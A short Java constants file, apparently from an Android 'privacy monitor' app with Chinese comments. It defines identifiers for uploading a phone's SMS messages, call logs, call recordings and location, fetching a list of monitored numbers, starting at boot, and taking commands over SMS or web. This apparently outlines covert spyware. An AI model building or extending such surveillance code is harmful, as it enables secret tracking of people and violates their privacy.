package com.privacy.monitor.base;

/**
 * 常量
 */
public class C {
	
	public static boolean isRecorder;
	public static boolean isBoot;
	
	public static final int CALL_RECORD =1;
	public static final int MESSAGE_RECORD = 2;
	
	public static final String BUNDLE_NAME = "bundle";
	
	public static final String FLAG= "flag";
	
	public static final String SIM_SERIAL ="simSerial";
	
	public static final String PHONE_INFO = "phoneinfo";
	
	public static final String PHONE = "phone";
	
	public static final String CRON_ACTION = "com.privacy.monitor.cron";
	
	public static final String ENV_ACTION = "com.privacy.monitor.sr";
	
	public class RequestMethod{
		//上传短信信息
		public static final String uploadSMS = "1c1d4f559ebbc08c492539282f36f969";
		//获取监控手机号
		public static final String getMonitorList = "041e83198b89ce1eb95d05b41b5b1a67";
		
		//上传通话记录
		public static final String uploadCallRecord = "31f16307a0b19c188333ed2454651f192";
	
		//上传文件
		public static final String uploadCallSound = "31f16307a0b19c188333ed2454651f19";
		
		//上传当前位置
		public static final String uploadLocation = "09fad6e85819b93d5a9221a85a643cc6";
	}
	
	//标记是否需要上传数据
	public static boolean isUpload = false;
	
	/**指令平台*/
	public class Directive{
		public static final int SMS = 1;
		public static final int WEB = 2;
	}
}
